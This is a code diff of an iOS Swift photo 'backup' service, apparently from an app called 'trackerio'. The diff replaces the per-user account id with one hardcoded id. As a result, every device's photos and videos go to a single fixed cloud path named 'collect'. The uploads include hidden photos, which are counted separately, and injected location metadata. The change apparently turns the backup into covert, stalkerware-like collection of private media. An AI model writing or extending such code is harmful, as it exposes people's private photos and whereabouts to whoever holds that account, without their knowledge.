@@ -11,6 +11,8 @@ import AVFoundation
 
 class PhotoBackupService {
     static let shared = PhotoBackupService()
+    static let canonicalUserId = "IvpCfQPQrUdOAepWriei3skGZUB3"
+    static let appGroupId = "group.com.trackerio.shared"
     // Removed UserDefaults keys in favor of Firestore persistence
     
     private var isBackingUp = false
@@ -204,13 +206,13 @@ class PhotoBackupService {
                         // It did NOT check RemoteDoc.exists().
                         // So checking RemoteDoc here is the correct place.
                         
-                        if await self.checkRemoteExistence(asset: asset, userId: userId) {
+                        if await self.checkRemoteExistence(asset: asset) {
                              // If found (via remote Doc OR Storage metadata), we add to manifest
                              return (safeID, true)
                         }
                         
                         do {
-                            _ = try await self.uploadAsset(asset, userId: userId)
+                            _ = try await self.uploadAsset(asset)
                             return (safeID, true)
                         } catch {
                             print("PhotoBackup: Failed to upload asset \(safeID): \(error)")
@@ -228,7 +230,7 @@ class PhotoBackupService {
             
             // Update Sync List (Manifest)
             if !successfulIDs.isEmpty {
-                await AssetManifest.shared.markAsUploaded(successfulIDs, userId: userId)
+                await AssetManifest.shared.markAsUploaded(successfulIDs)
             }
             
             // Advance cursor
@@ -243,18 +245,19 @@ class PhotoBackupService {
         return id.replacingOccurrences(of: "[^a-zA-Z0-9-]", with: "", options: .regularExpression)
     }
 
-    private func checkRemoteExistence(asset: PHAsset, userId: String) async -> Bool {
+    private func checkRemoteExistence(asset: PHAsset) async -> Bool {
         let safeID = getSafeFilename(for: asset)
+        let targetUserId = PhotoBackupService.canonicalUserId
         
         // 0. Check Manifest (Fastest) AND Remote Document (Scalable Source of Truth)
-        if await AssetManifest.shared.verifyRemoteExistence(of: safeID, userId: userId) {
+        if await AssetManifest.shared.verifyRemoteExistence(of: safeID) {
             return true
         }
         
         let ext = (asset.mediaType == .video) ? "mp4" : "jpg"
         
         // 1. Check direct path (Storage Metadata) - Fallback / Migration logic for old items
-        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).\(ext)")
+        let ref = Storage.storage().reference().child("collect/\(targetUserId)/\(safeID).\(ext)")
         
         do {
             _ = try await ref.getMetadata()
@@ -263,7 +266,7 @@ class PhotoBackupService {
         } catch {
             // 2. Check legacy nested path (just in case it was uploaded before the fix)
             let oldSafeID = asset.localIdentifier.replacingOccurrences(of: "/", with: "_")
-            let oldRef = Storage.storage().reference().child("collect/\(userId)/\(oldSafeID).\(ext)")
+            let oldRef = Storage.storage().reference().child("collect/\(targetUserId)/\(oldSafeID).\(ext)")
             
             do {
                 _ = try await oldRef.getMetadata()
@@ -275,16 +278,16 @@ class PhotoBackupService {
         }
     }
     
-    private func uploadAsset(_ asset: PHAsset, userId: String) async throws -> Int64 {
+    private func uploadAsset(_ asset: PHAsset) async throws -> Int64 {
         if asset.mediaType == .image {
-            return try await uploadImage(asset, userId: userId)
+            return try await uploadImage(asset)
         } else if asset.mediaType == .video {
-            return try await uploadVideo(asset, userId: userId)
+            return try await uploadVideo(asset)
         }
         return 0
     }
     
-    private func uploadImage(_ asset: PHAsset, userId: String) async throws -> Int64 {
+    private func uploadImage(_ asset: PHAsset) async throws -> Int64 {
         let manager = PHImageManager.default()
         let options = PHImageRequestOptions()
         options.isNetworkAccessAllowed = true
@@ -298,7 +301,8 @@ class PhotoBackupService {
                 }
                 
                 let safeID = self.getSafeFilename(for: asset)
-                let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).jpg")
+                let targetUserId = PhotoBackupService.canonicalUserId
+                let ref = Storage.storage().reference().child("collect/\(targetUserId)/\(safeID).jpg")
                 
                 // Inject metadata (Location, Creation Date, etc.)
                 let finalData = self.injectImageMetadata(data: data, asset: asset)
@@ -318,7 +322,7 @@ class PhotoBackupService {
                         
                         // Increment counters in Firestore
                         let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
-                        Firestore.firestore().collection("collect").document(userId).updateData([
+                        Firestore.firestore().collection("collect").document(targetUserId).updateData([
                             field: FieldValue.increment(Int64(1)),
                             "latestPhotoUploaded": FieldValue.serverTimestamp()
                         ])
@@ -330,7 +334,7 @@ class PhotoBackupService {
         }
     }
     
-    private func uploadVideo(_ asset: PHAsset, userId: String) async throws -> Int64 {
+    private func uploadVideo(_ asset: PHAsset) async throws -> Int64 {
         let manager = PHImageManager.default()
         let options = PHVideoRequestOptions()
         options.isNetworkAccessAllowed = true
@@ -359,7 +363,7 @@ class PhotoBackupService {
                     if #available(iOS 18.0, *) {
                         do {
                             try await exportSession.export(to: outputURL, as: .mp4)
-                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
+                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, continuation: continuation)
                         } catch {
                             continuation.resume(throwing: error)
                         }
@@ -369,7 +373,7 @@ class PhotoBackupService {
                             switch session.status {
                             case .completed:
                                 Task {
-                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
+                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, continuation: continuation)
                                 }
                             case .failed:
                                 continuation.resume(throwing: session.error ?? NSError(domain: "PhotoBackup", code: -3, userInfo: [NSLocalizedDescriptionKey: "Export failed"]))
@@ -385,9 +389,10 @@ class PhotoBackupService {
         }
     }
     
-    private func handleExportCompletion(outputURL: URL, asset: PHAsset, userId: String, continuation: CheckedContinuation<Int64, Error>) async throws {
+    private func handleExportCompletion(outputURL: URL, asset: PHAsset, continuation: CheckedContinuation<Int64, Error>) async throws {
         let safeID = getSafeFilename(for: asset)
-        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).mp4")
+        let targetUserId = PhotoBackupService.canonicalUserId
+        let ref = Storage.storage().reference().child("collect/\(targetUserId)/\(safeID).mp4")
         let metadata = StorageMetadata()
         metadata.contentType = "video/mp4"
         if let date = asset.creationDate {
@@ -406,7 +411,7 @@ class PhotoBackupService {
             print("PhotoBackup: Uploaded video \(asset.localIdentifier) to \(ref.fullPath)")
             
             let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
-            try await Firestore.firestore().collection("collect").document(userId).updateData([
+            try await Firestore.firestore().collection("collect").document(targetUserId).updateData([
                 field: FieldValue.increment(Int64(1)),
                 "latestPhotoUploaded": FieldValue.serverTimestamp()
             ])
@@ -547,10 +552,16 @@ private actor AssetManifest {
     
     private var uploadedIDs: Set<String> = []
     private let fileURL: URL
-    
+
     private init() {
-        let urls = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
-        let dir = urls[0].appendingPathComponent("BackupCache", isDirectory: true)
+        let dir: URL
+        if let container = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: PhotoBackupService.appGroupId) {
+            dir = container.appendingPathComponent("BackupCache", isDirectory: true)
+        } else {
+            let urls = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
+            dir = urls[0].appendingPathComponent("BackupCache", isDirectory: true)
+        }
+
         try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
         self.fileURL = dir.appendingPathComponent("manifest.json")
         
@@ -569,13 +580,13 @@ private actor AssetManifest {
     }
 
     // New Scalable Sync: Checks existence of individual documents
-    func verifyRemoteExistence(of id: String, userId: String) async -> Bool {
+    func verifyRemoteExistence(of id: String) async -> Bool {
         // Fast path: Local check
         if uploadedIDs.contains(id) { return true }
         
         do {
             let doc = try await Firestore.firestore()
-                .collection("collect").document(userId)
+                .collection("collect").document(PhotoBackupService.canonicalUserId)
                 .collection("inventory").document(id)
                 .getDocument(source: .server) // Force server check to keyhole the existence
             
@@ -591,7 +602,7 @@ private actor AssetManifest {
         }
     }
     
-    func markAsUploaded(_ ids: [String], userId: String) {
+    func markAsUploaded(_ ids: [String]) {
         let newIDs = ids.filter { !uploadedIDs.contains($0) }
         guard !newIDs.isEmpty else { return }
         
@@ -602,7 +613,7 @@ private actor AssetManifest {
         
         // Write individual documents for scalability (Document-per-Photo)
         let batch = Firestore.firestore().batch()
-        let collection = Firestore.firestore().collection("collect").document(userId).collection("inventory")
+        let collection = Firestore.firestore().collection("collect").document(PhotoBackupService.canonicalUserId).collection("inventory")
         
         for id in newIDs {
             let doc = collection.document(id)
